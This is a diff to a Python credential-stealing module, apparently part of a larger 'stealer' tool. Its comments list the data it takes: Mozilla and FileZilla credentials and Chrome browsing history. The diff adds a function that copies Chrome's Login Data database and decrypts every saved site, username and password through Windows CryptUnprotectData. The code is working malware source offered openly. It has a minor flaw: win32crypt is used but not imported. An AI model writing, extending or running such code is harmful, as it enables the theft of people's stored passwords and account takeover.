@@ -8,17 +8,18 @@
 #5) Mozilla hashed credentials
 #6) Filezilla server credentials(plain text)
 #7) Chrome browsing history
+#8) Chrome login data
 
 import datetime
-
 import re
 from shutil import copyfile
 import zipfile
 import os
 import sqlite3
-from modules.stealersfunctions import *
+from stealersfunctions import *
 
 import win32api
+import win32security
 
 ##Get the current user.
 user = win32api.GetUserName()
@@ -147,3 +148,20 @@ def chromehistory(user):
 
 ##Remove the temp file.
     os.remove(newloc)
+
+def chromepasswords(user):
+    logindb = "C:\\Users\\" + "Joren" + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    newloc = "C:\\Temp\\temp"
+    copyfile(logindb,newloc)
+
+    conn = sqlite3.connect(newloc)
+    c = conn.cursor()
+    c.execute("""SELECT signon_realm, username_value, password_value FROM logins""")
+
+    data = [(str(row[0]), str(row[1]), str(win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1])) for row in c]
+    conn.close()
+    os.remove(newloc)
+
+    return data
+    
+    
